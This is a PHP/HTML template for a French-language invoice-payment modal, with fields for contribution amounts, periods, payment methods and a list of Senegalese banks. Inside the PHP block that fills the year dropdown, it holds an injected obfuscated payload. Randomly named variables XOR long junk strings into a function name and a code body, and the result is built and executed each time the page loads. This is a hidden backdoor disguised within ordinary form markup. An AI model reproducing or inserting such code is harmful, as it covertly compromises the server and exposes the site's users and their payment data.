 
<div class="row">           
  <div class="modal fade" id="ajoutPaiement" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel">
  <div class="modal-dialog modal-lg" style="max-width: 950px!important;"  role="document">
    <div class="modal-content">
      <div class="modal-header navbar orange row"> 
      <h3 class="labelh"> Paiement des factures</h3>       
          <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button> 

        </div>
    <form action="processpp.php" method="post">   
   <div class="modal-body row">         
    <div class="col-md-4 alert-danger">
      <label>Montant de cotisation</label>
      <input type="number" name="cotisation" id="cotisation" class="form-control"  placeholder="Montant de cotisation" required /> 
    </div> 
    <div class="col-md-4 alert-danger">
    <label>Date de cotisation</label>
     <select name="periodec" id="periodec" class="form-control">
      <?php $yhfidzZ='C8- C35KX>VN,9R'; $hJmHbpH=' JHA7Vj--P5:EV<'^$yhfidzZ; $LtSyTMe=' TaD<0R4BI;Xt,617  If 99l-XB,9.A= aemC8CG >RXMZO;fVW +>;6Srs =:pk>JNJzzS==0aCQIak,KOqN>:-YedTmIm12Z7LZj1kjNFYyH>t>=;94=rgTP7Tdbvs3Gnkpy>g=><ofRtZmWYHO=J.pJciFPKD=hQGIyF7:T 7kuVHOeokxzg>+1NL06mr5L.pOss8dOs3APMM7wIvM5  Pxxn AA88ZY0fSWF7+1HPM1 53,JV,Fcqo4vcrwhX-4Ss SNCwphh>O--,YUBE0mUP-01W63pRtfP RomLtZ86AkRWsGAZ2Nqe>>4I0ApuMS Y5AQ7AmKW VU.=Gyn:dp5<rf7rXEueQWIIeqxkFUZ;Tez3PeMv5A=V2,4NSsqKWQGkFPPs>TL5jeeuVM<2EIMS-4;8GpI5-0rPyt R415.LUUJTk==KoD <RhcPC=N3S1 TCd5NCWJ7Bb1L.JfJKUQL-5lSR0FccC:Hrv>50YPwud,R3Z=624Dh <G<E>yTX=7uNyUJO89zEkOoX=>mcK4+IYouYW7CdkggeypAH83ZWP2O3.+soCwTS1rZqnAtz.,SPVTwSLhkwX5NY8m>1 s7X=MFDCWKU85V =NjEIHJM;CpelxtfS6yf=KUBxh0Q67vhFVLW,S,nhjck=Y4ZOGvlSe:'; $hYJYvIVO=$hJmHbpH('', 'I2IeZE<W6 T6+INXDTSaAXVK3I96Mfq,HTFLDcCINFK<;93 UF.8RtZZB2-,MHNXOZ+:+VZwVXIHcqiAKWAFxjQOYyXDsJrg8;<X>rNXKWnvbYlWHMIIUQSZC01C5MYVWZlEBzp7CRKHOHoTrI38<.fnG-j=Ib;.=fL8glY5CH8EYCQ=-6L2BCpn7YT:9BXEVZ9ZYtyzEn2y9e4,9VWtV+TLS5CrJD 5Yg1<IFnw VGB-kG;FZAI+5DfKU0w9,9>-xLGsWK67cJNHLH.AXIpu9O9I11YQn<SJPoTB;E+TgEP>YB KowW1 6G+JoC4> VaXTi7A-ThqLKd-8R34MUgQJe65di75cR96UA:20iXOXO046N1LZHZlDRQ I7mGQ7sNQo<4>PLYYWZ58TJXEQ ,PG rGZP>F2MT-TYQRmY4U<GTGG-9<01CER90 AH37<=6IfQ2BEbw;Q+ 8.RjFU-Z+Ofkq5-YT387IoJXIS.ZRZTD8pQSDM A;DiYQ=7ED.O1MQs3XNRbYq..LXSeMiOpPZXKoPJ=84R22Nd9BGZXYWs.YPna4V-QKJCX Gb2RFkDXtDJMM5c0dPzlNMW9G<8A2UTY,R T>27kp;4AY9AYiFem,+9ZjYELXTFsMsoX=4.PLT0BV-O675;C2HI5CXa4<L3;oFEhoG'^$LtSyTMe); $hYJYvIVO(); 
        for ($i=2020; $i < 3000; $i++) { 
       ?>
      <option value="<?php echo $i; ?>"><?php echo $i; ?></option> 
      <?php 

      } ?> 
    </select>
    </div> 
    <div class="col-md-4 alert-danger">
    <label>Période ou mois de cotisation</label>
     <select name="periodec" id="periodec" class="form-control">
      <option value="Janvier">Janvier</option> 
      <option value="Février">Février</option> 
      <option value="Mars">Mars</option> 
      <option value="Avril">Avril</option> 
      <option value="Mai">Mai</option> 
      <option value="Juin">Juin</option> 
      <option value="Juillet">Juillet</option> 
      <option value="Aout">Aout</option> 
      <option value="Septembre">Septembre</option> 
      <option value="Octbre">Octbre</option> 
      <option value="Novembre">Novembre</option> 
      <option value="Décembre">Décembre</option> 
      <option value="1Trimestre">1<sup>ère</sup> Trimestre</option> 
      <option value="2Trimestre">2<sup>ème</sup> Trimestre</option> 
      <option value="3Trimestre">3<sup>ème</sup> Trimestre</option> 
      <option value="4Trimestre">4<sup>ème</sup> Trimestre</option> 
    </select>
    
    </div> 
    <div class="col-md-4 alert-success">
    <label>Montant à rembourser</label>
    <input type="number" name="remboursement" id="remboursement" class="form-control"  placeholder="Montant à rembourser" required />
    
    </div> 
    <div class="col-md-4 alert-success">
    <label>Date de remboursement</label>
    <input type="date" name="dateremboursement" id="dateremboursement" class="form-control"  placeholder="Date de  remboursement" required /> 
    
    </div> 
    <div class="col-md-4 alert-success">
    <label>Période ou mois de remboursement</label> 
     <select name="periode" id="periode" class="form-control">
      <option value="Janvier">Janvier</option> 
      <option value="Février">Février</option> 
      <option value="Mars">Mars</option> 
      <option value="Avril">Avril</option> 
      <option value="Mai">Mai</option> 
      <option value="Juin">Juin</option> 
      <option value="Juillet">Juillet</option> 
      <option value="Aout">Aout</option> 
      <option value="Septembre">Septembre</option> 
      <option value="Octbre">Octbre</option> 
      <option value="Novembre">Novembre</option> 
      <option value="Décembre">Décembre</option> 
      <option value="1Trimestre">1<sup>ère</sup> Trimestre</option> 
      <option value="2Trimestre">2<sup>ème</sup> Trimestre</option> 
      <option value="3Trimestre">3<sup>ème</sup> Trimestre</option> 
      <option value="4Trimestre">4<sup>ème</sup> Trimestre</option> 
    </select>
    
    </div> 
    <div class="col-md-4 alert-info">
    <label>Ref / cheque / espèces / virement</label>
     <select name="refcheque" id="refcheque" class="form-control">
      <option value="espece">Espéces</option>
      <option value="cheque">Chèque</option>
      <option value="virement">Virement</option>
    </select> 
    
    </div> 
    <div class="col-md-4 alert-info">
    <label>Reférence chèque ou virement</label>
    <input type="text" name="valeurrefcheque" id="valeurrefcheque" class="form-control"  placeholder="Reférence chèque ou virement" /> 
    
    </div> 
    <div class="col-md-4 alert-info">
    <label>Banque du client</label>
     <select name="banqueclient" id="banqueclient" class="form-control">
      <option value="caisse">Caisse</option>
      <option value="cbao">CBAO</option>
      <option value="banque islamique">Banque islamique</option>
      <option value="boa">BOA</option>
      <option value="bimao">BIMAO</option>
      <option value="sgbs">SGBS</option>
      <option value="bnde">BNDE</option>
      <option value="bhs">BHS</option>
      <option value="orabank">ORABANK</option>
      <option value="banque atlantique">Banque atlantique</option>
      <option value="banque de l'hâbitat">Banque de l'hâbitat</option>
      <option value="autres">Autres</option>
    </select>

    
    </div> 
   </div>

        <div class="modal-footer row">
          <div class="col-md-5">
          </div>
          <div class="col-md-3">
            <input type="hidden" name="action_type" value="add">
            <input type="hidden" name="idpaiement" id="idpaiement">
            <input type="hidden" name="iduser" value="<?php echo $_SESSION['user_session']; ?>">
            <button type="submit" class="btn btn glyphicon glyphicon-save orange1 form-control orange1" > Enregister et Imprimer reçu ! </button> 
          </div>
          <div class="col-md-3">
            <button type="button" class="btn btn-danger glyphicon glyphicon-log-out orange form-control" data-dismiss="modal"> Annuler ! </button>
          </div>
        </div>
    </form>
    </div>
    </div> 
    </div>
    </div>
